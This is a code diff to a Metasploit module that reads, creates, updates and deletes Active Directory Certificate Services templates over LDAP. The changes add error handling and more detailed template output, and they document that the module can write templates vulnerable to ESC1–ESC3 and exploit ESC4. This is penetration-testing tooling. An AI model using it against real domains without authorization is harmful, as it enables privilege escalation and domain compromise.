@@ -6,6 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::Remote::LDAP
+  include Msf::OptionalSession::LDAP
   include Msf::Auxiliary::Report
 
   IGNORED_ATTRIBUTES = [
@@ -42,11 +43,15 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'AD CS Certificate Template Management',
         'Description' => %q{
-          This module can read, write, update, and delete AD CS certificate templates from a Active Directory Domain
+          This module can create, read, update, and delete AD CS certificate templates from a Active Directory Domain
           Controller.
 
           The READ, UPDATE, and DELETE actions will write a copy of the certificate template to disk that can be
-          restored using the CREATE or UPDATE actions.
+          restored using the CREATE or UPDATE actions. The CREATE and UPDATE actions require a certificate template data
+          file to be specified to define the attributes. Template data files are provided to create a template that is
+          vulnerable to ESC1, ESC2, and ESC3.
+
+          This module is capable of exploiting ESC4.
         },
         'Author' => [
           'Will Schroeder', # original idea/research
@@ -69,7 +74,8 @@ class MetasploitModule < Msf::Auxiliary
         'Notes' => {
           'Stability' => [],
           'SideEffects' => [CONFIG_CHANGES],
-          'Reliability' => []
+          'Reliability' => [],
+          'AKA' => [ 'Certifry', 'Certipy' ]
         }
       )
     )
@@ -104,7 +110,7 @@ class MetasploitModule < Msf::Auxiliary
       else
         print_status('Discovering base DN automatically')
 
-        unless (@base_dn = discover_base_dn(ldap))
+        unless (@base_dn = ldap.base_dn)
           fail_with(Failure::NotFound, "Couldn't discover base DN!")
         end
       end
@@ -113,15 +119,19 @@ class MetasploitModule < Msf::Auxiliary
       send("action_#{action.name.downcase}")
       print_good('The operation completed successfully!')
     end
+  rescue Errno::ECONNRESET
+    fail_with(Failure::Disconnected, 'The connection was reset.')
   rescue Rex::ConnectionError => e
-    print_error("#{e.class}: #{e.message}")
+    fail_with(Failure::Unreachable, e.message)
+  rescue Rex::Proto::Kerberos::Model::Error::KerberosError => e
+    fail_with(Failure::NoAccess, e.message)
   rescue Net::LDAP::Error => e
-    print_error("#{e.class}: #{e.message}")
+    fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
   end
 
   def get_certificate_template
     obj = ldap_get(
-      "(&(cn=#{datastore['CERT_TEMPLATE']})(objectClass=pkicertificatetemplate))",
+      "(&(cn=#{datastore['CERT_TEMPLATE']})(objectClass=pKICertificateTemplate))",
       base: "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,#{@base_dn}",
       controls: [ms_security_descriptor_control(DACL_SECURITY_INFORMATION)]
     )
@@ -147,6 +157,35 @@ class MetasploitModule < Msf::Auxiliary
     fail_with(Failure::NotFound, 'The domain SID was not found!') unless obj&.fetch('objectsid', nil)
 
     Rex::Proto::MsDtyp::MsDtypSid.read(obj['objectsid'].first)
+  end
+
+  def get_pki_oids
+    return @pki_oids if @pki_oids.present?
+
+    raw_objs = @ldap.search(
+      base: "CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,#{@base_dn}",
+      filter: '(objectClass=msPKI-Enterprise-OID)'
+    )
+    validate_query_result!(@ldap.get_operation_result.table)
+    return nil unless raw_objs
+
+    @pki_oids = []
+    raw_objs.each do |raw_obj|
+      obj = {}
+      raw_obj.attribute_names.each do |attr|
+        obj[attr.to_s] = raw_obj[attr].map(&:to_s)
+      end
+
+      @pki_oids << obj
+    end
+    @pki_oids
+  end
+
+  def get_pki_oid_displayname(oid)
+    oid_obj = get_pki_oids.find { |o| o['mspki-cert-template-oid'].first == oid }
+    return nil unless oid_obj && oid_obj['displayname'].present?
+
+    oid_obj['displayname'].first
   end
 
   def dump_to_json(template)
@@ -298,16 +337,16 @@ class MetasploitModule < Msf::Auxiliary
 
     print_status('Certificate Template:')
     print_status("  distinguishedName: #{obj['distinguishedname'].first}")
-    print_status("  displayName:       #{obj['displayname'].first}") if obj['displayname'].first.present?
+    print_status("  displayName:       #{obj['displayname'].first}") if obj['displayname'].present?
     if obj['objectguid'].first.present?
       object_guid = Rex::Proto::MsDtyp::MsDtypGuid.read(obj['objectguid'].first)
       print_status("  objectGUID:        #{object_guid}")
     end
 
-    mspki_flag = obj['mspki-certificate-name-flag'].first
-    if mspki_flag.present?
-      mspki_flag = [obj['mspki-certificate-name-flag'].first.to_i].pack('l').unpack1('L')
-      print_status("  msPKI-Certificate-Name-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}")
+    pki_flag = obj['mspki-certificate-name-flag']&.first
+    if pki_flag.present?
+      pki_flag = [obj['mspki-certificate-name-flag'].first.to_i].pack('l').unpack1('L')
+      print_status("  msPKI-Certificate-Name-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
       %w[
         CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
         CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME
@@ -323,16 +362,16 @@ class MetasploitModule < Msf::Auxiliary
         CT_FLAG_SUBJECT_REQUIRE_DIRECTORY_PATH
         CT_FLAG_OLD_CERT_SUPPLIES_SUBJECT_AND_ALT_NAME
       ].each do |flag_name|
-        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
+        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
           print_status("    * #{flag_name}")
         end
       end
     end
 
-    mspki_flag = obj['mspki-enrollment-flag'].first
-    if mspki_flag.present?
-      mspki_flag = [obj['mspki-enrollment-flag'].first.to_i].pack('l').unpack1('L')
-      print_status("  msPKI-Enrollment-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}")
+    pki_flag = obj['mspki-enrollment-flag']&.first
+    if pki_flag.present?
+      pki_flag = [obj['mspki-enrollment-flag'].first.to_i].pack('l').unpack1('L')
+      print_status("  msPKI-Enrollment-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
       %w[
         CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS
         CT_FLAG_PEND_ALL_REQUESTS
@@ -352,16 +391,16 @@ class MetasploitModule < Msf::Auxiliary
         CT_FLAG_ISSUANCE_POLICIES_FROM_REQUEST
         CT_FLAG_SKIP_AUTO_RENEWAL
       ].each do |flag_name|
-        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
+        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
           print_status("    * #{flag_name}")
         end
       end
     end
 
-    mspki_flag = obj['mspki-private-key-flag'].first
-    if mspki_flag.present?
-      mspki_flag = [obj['mspki-private-key-flag'].first.to_i].pack('l').unpack1('L')
-      print_status("  msPKI-Private-Key-Flag: 0x#{mspki_flag.to_s(16).rjust(8, '0')}")
+    pki_flag = obj['mspki-private-key-flag']&.first
+    if pki_flag.present?
+      pki_flag = [obj['mspki-private-key-flag'].first.to_i].pack('l').unpack1('L')
+      print_status("  msPKI-Private-Key-Flag: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
       %w[
         CT_FLAG_REQUIRE_PRIVATE_KEY_ARCHIVAL
         CT_FLAG_EXPORTABLE_KEY
@@ -378,23 +417,60 @@ class MetasploitModule < Msf::Auxiliary
         CT_FLAG_EK_VALIDATE_KEY
         CT_FLAG_HELLO_LOGON_KEY
       ].each do |flag_name|
-        if mspki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
+        if pki_flag & Rex::Proto::MsCrtd.const_get(flag_name) != 0
           print_status("    * #{flag_name}")
         end
       end
     end
 
-    mspki_flag = obj['mspki-ra-signature'].first
-    if mspki_flag.present?
-      mspki_flag = [obj['mspki-ra-signature'].first.to_i].pack('l').unpack1('L')
-      print_status("  msPKI-RA-Signature: 0x#{mspki_flag.to_s(16).rjust(8, '0')}")
+    pki_flag = obj['mspki-ra-signature']&.first
+    if pki_flag.present?
+      pki_flag = [pki_flag.to_i].pack('l').unpack1('L')
+      print_status("  msPKI-RA-Signature: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
+    end
+
+    if obj['mspki-certificate-policy'].present?
+      if obj['mspki-certificate-policy'].length == 1
+        if (oid_name = get_pki_oid_displayname(obj['mspki-certificate-policy'].first)).present?
+          print_status("  msPKI-Certificate-Policy: #{obj['mspki-certificate-policy'].first} (#{oid_name})")
+        else
+          print_status("  msPKI-Certificate-Policy: #{obj['mspki-certificate-policy'].first}")
+        end
+      else
+        print_status('  msPKI-Certificate-Policy:')
+        obj['mspki-certificate-policy'].each do |value|
+          if (oid_name = get_pki_oid_displayname(value)).present?
+            print_status("    * #{value} (#{oid_name})")
+          else
+            print_status("    * #{value}")
+          end
+        end
+      end
+    end
+
+    if obj['mspki-template-schema-version'].present?
+      print_status("  msPKI-Template-Schema-Version: #{obj['mspki-template-schema-version'].first.to_i}")
+    end
+
+    pki_flag = obj['pkikeyusage']&.first
+    if pki_flag.present?
+      pki_flag = [pki_flag.to_i].pack('l').unpack1('L')
+      print_status("  pKIKeyUsage: 0x#{pki_flag.to_s(16).rjust(8, '0')}")
     end
 
     if obj['pkiextendedkeyusage'].present?
       print_status('  pKIExtendedKeyUsage:')
       obj['pkiextendedkeyusage'].each do |value|
-        print_status("    * #{value}")
+        if (oid = Rex::Proto::CryptoAsn1::OIDs.value(value)) && oid.label.present?
+          print_status("    * #{value} (#{oid.label})")
+        else
+          print_status("    * #{value}")
+        end
       end
+    end
+
+    if obj['pkimaxissuingdepth'].present?
+      print_status("  pKIMaxIssuingDepth: #{obj['pkimaxissuingdepth'].first.to_i}")
     end
   end
 
